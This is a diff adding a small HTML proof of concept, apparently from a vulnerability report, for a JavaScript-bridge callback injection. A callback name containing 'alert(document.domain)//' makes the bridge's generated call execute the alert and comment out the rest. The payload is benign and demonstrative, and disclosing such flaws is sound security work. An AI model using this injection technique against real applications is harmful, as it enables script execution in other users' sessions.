@@ -1,0 +1,15 @@
+<html>
+<body>
+<script>
+// Register malicious callback name
+window['alert(document.domain)//'] = function() {};
+
+// When JS bridge responds, it generates:
+// window['alert(document.domain)//']('secret', data);
+
+// Which executes as:
+// alert(document.domain)// <- This runs!
+// //']('secret', data); // <- This is commented out
+</script>
+</body>
+</html>
